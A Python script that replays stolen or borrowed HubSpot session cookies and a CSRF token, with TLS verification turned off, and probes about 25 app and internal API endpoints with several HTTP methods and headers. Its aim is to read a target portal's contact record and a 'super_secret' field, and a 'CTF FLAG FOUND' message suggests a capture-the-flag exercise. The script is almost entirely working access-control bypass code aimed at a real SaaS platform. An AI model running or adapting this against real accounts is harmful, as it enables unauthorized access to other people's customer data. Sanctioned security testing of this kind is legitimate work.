#!/usr/bin/env python3
"""
Exhaustive direct access attempts to contact ID 1
Using session cookies and trying every possible variation
"""

import requests
import json
import os
import re
import urllib3
from dotenv import load_dotenv

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'
CONTACT_ID = '1'

print("="*80)
print(f"EXHAUSTIVE CONTACT ACCESS ATTEMPTS")
print(f"Portal: {TARGET_PORTAL} | Contact: {CONTACT_ID}")
print("="*80)

session = requests.Session()

# Set cookies
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# Extract CSRF token
csrf_token = None
if 'hubspotapi-csrf=' in SESSION_COOKIES:
    match = re.search(r'hubspotapi-csrf=([^;]+)', SESSION_COOKIES)
    if match:
        csrf_token = match.group(1)

findings = []

# ============================================================================
# COMPREHENSIVE ENDPOINT LIST
# ============================================================================

endpoints = [
    # Standard contact endpoints with various paths
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/view',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/details',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/properties',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/data',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/json',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/export',

    # Record paths
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/record/0-1/{CONTACT_ID}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/record/0-1/{CONTACT_ID}/',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/record/0-1/{CONTACT_ID}/view',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/record/0-1/{CONTACT_ID}/details',

    # Object paths
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/{CONTACT_ID}',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/objects/0-1/{CONTACT_ID}/view',

    # Embed endpoints
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/embed',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/embed/properties',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/record/0-1/{CONTACT_ID}/embed',

    # API endpoints with session
    f'https://app.hubspot.com/api/contacts/v1/contact/vid/{CONTACT_ID}/profile?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm-objects/v1/objects/0-1/{CONTACT_ID}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm/v3/objects/contacts/{CONTACT_ID}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/api/crm/v3/objects/contacts/{CONTACT_ID}?portalId={TARGET_PORTAL}&properties=firstname,super_secret',

    # Internal record APIs
    f'https://app.hubspot.com/crm-record-ui/api/record/0-1/{CONTACT_ID}?portalId={TARGET_PORTAL}',
    f'https://app.hubspot.com/crm-contacts-ui/api/contact/{CONTACT_ID}?portalId={TARGET_PORTAL}',

    # Ajax/data endpoints
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}.json',
    f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}/data.json',
]

# Test each endpoint with multiple methods
methods_to_try = ['GET', 'POST', 'OPTIONS']

for endpoint in endpoints:
    endpoint_short = endpoint.split(TARGET_PORTAL)[1][:50]

    for method in methods_to_try:
        # Build headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Referer': f'https://app.hubspot.com/contacts/{TARGET_PORTAL}/contact/{CONTACT_ID}',
        }

        # Try with different Accept headers
        accept_headers_to_try = [
            'application/json',
            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            '*/*',
        ]

        for accept in accept_headers_to_try:
            headers['Accept'] = accept

            # Add CSRF for POST
            if method == 'POST' and csrf_token:
                headers['X-HubSpot-CSRF-hubspotapi'] = csrf_token
                headers['Content-Type'] = 'application/json'

            try:
                if method == 'GET':
                    r = session.get(endpoint, headers=headers, verify=False, timeout=10)
                elif method == 'POST':
                    # Try with and without body
                    for body in [None, {'properties': ['firstname', 'super_secret']}]:
                        r = session.post(endpoint, headers=headers, json=body, verify=False, timeout=10)

                        if r.status_code == 200:
                            print(f"\n*** SUCCESS! ***")
                            print(f"Method: POST (with body: {body is not None})")
                            print(f"Endpoint: {endpoint}")
                            print(f"Accept: {accept}")
                            print(f"Status: {r.status_code}")

                            # Try to parse as JSON
                            try:
                                data = r.json()
                                print(f"\nJSON Response:")
                                print(json.dumps(data, indent=2)[:1000])

                                if 'super_secret' in json.dumps(data).lower() or 'firstname' in json.dumps(data).lower():
                                    print(f"\n*** CONTAINS CONTACT DATA! ***")

                                    findings.append({
                                        'method': 'POST',
                                        'endpoint': endpoint,
                                        'accept': accept,
                                        'with_body': body is not None,
                                        'data': data
                                    })
                            except:
                                # Check if it's HTML with embedded data
                                if len(r.text) > 1000 and ('firstname' in r.text.lower() or 'super_secret' in r.text.lower()):
                                    print(f"\nHTML Response contains contact keywords!")
                                    print(f"Size: {len(r.text)} bytes")

                                    # Extract data
                                    patterns = [
                                        r'"firstname"\s*:\s*"([^"]+)"',
                                        r'"super_secret"\s*:\s*"([^"]+)"',
                                    ]

                                    for pattern in patterns:
                                        matches = re.findall(pattern, r.text, re.I)
                                        if matches:
                                            print(f"Found: {pattern[:30]}: {matches[:3]}")
                                            findings.append({
                                                'method': 'POST',
                                                'endpoint': endpoint,
                                                'pattern': pattern,
                                                'matches': matches
                                            })

                    continue  # Skip the rest for POST since we already tried it

                else:  # OPTIONS
                    r = session.options(endpoint, headers=headers, verify=False, timeout=10)

                # Check for success
                if r.status_code == 200:
                    print(f"\n*** SUCCESS! ***")
                    print(f"Method: {method}")
                    print(f"Endpoint: {endpoint_short}...")
                    print(f"Accept: {accept}")
                    print(f"Status: {r.status_code}")
                    print(f"Size: {len(r.text)} bytes")

                    # Try to parse as JSON
                    try:
                        data = r.json()
                        print(f"\nJSON Response:")
                        print(json.dumps(data, indent=2)[:1000])

                        if 'super_secret' in json.dumps(data).lower() or 'firstname' in json.dumps(data).lower():
                            print(f"\n*** CONTAINS CONTACT DATA! ***")

                            findings.append({
                                'method': method,
                                'endpoint': endpoint,
                                'accept': accept,
                                'data': data
                            })

                            # Extract the values
                            if isinstance(data, dict):
                                firstname = data.get('firstname') or data.get('properties', {}).get('firstname')
                                super_secret = data.get('super_secret') or data.get('properties', {}).get('super_secret')

                                if firstname or super_secret:
                                    print(f"\n{'='*80}")
                                    print(f"*** CTF FLAG FOUND! ***")
                                    print(f"{'='*80}")
                                    if firstname:
                                        print(f"Firstname: {firstname}")
                                    if super_secret:
                                        print(f"Super Secret: {super_secret}")

                                    with open('/home/user/Hub/findings/CTF_FLAG_FINAL_SUCCESS.json', 'w') as f:
                                        json.dump({
                                            'firstname': firstname,
                                            'super_secret': super_secret,
                                            'full_data': data,
                                            'method': method,
                                            'endpoint': endpoint
                                        }, f, indent=2)
                    except:
                        # Check if it's HTML with embedded data
                        if len(r.text) > 1000 and ('firstname' in r.text.lower() or 'super_secret' in r.text.lower()):
                            print(f"\nHTML Response contains contact keywords!")
                            print(f"Size: {len(r.text)} bytes")

                            # Extract actual values (not just labels)
                            patterns = [
                                r'"firstname"\s*:\s*{\s*"value"\s*:\s*"([^"]+)"',
                                r'"super_secret"\s*:\s*{\s*"value"\s*:\s*"([^"]+)"',
                                r'"firstname"\s*:\s*"([^"]+)"',
                                r'"super_secret"\s*:\s*"([^"]+)"',
                            ]

                            for pattern in patterns:
                                matches = re.findall(pattern, r.text, re.I)
                                if matches:
                                    # Filter out labels
                                    real_values = [m for m in matches if m.lower() not in ['firstname', 'super_secret', 'text', 'string', 'value']]

                                    if real_values:
                                        print(f"Found {pattern[:40]}: {real_values[:3]}")

                                        if 'firstname' in pattern.lower():
                                            print(f"\n{'='*80}")
                                            print(f"*** FIRSTNAME FOUND! ***")
                                            print(f"{'='*80}")
                                            print(f"Value: {real_values[0]}")

                                            findings.append({
                                                'method': method,
                                                'endpoint': endpoint,
                                                'firstname': real_values[0]
                                            })

                elif r.status_code not in [401, 403, 404, 405]:
                    # Log other interesting status codes
                    print(f"\n{method} {endpoint_short}... -> {r.status_code}")

            except Exception as e:
                pass  # Suppress errors to keep output clean

print("\n" + "="*80)
print("EXHAUSTIVE ACCESS TESTING COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL ACCESS POINTS! ***\n")

    with open('/home/user/Hub/findings/contact_access_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    print("Saved: findings/contact_access_findings.json")

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:500]}")
else:
    print("\nNo direct access found to contact data.")
    print("All attempts returned 401/403/404/405 or contained no data.")
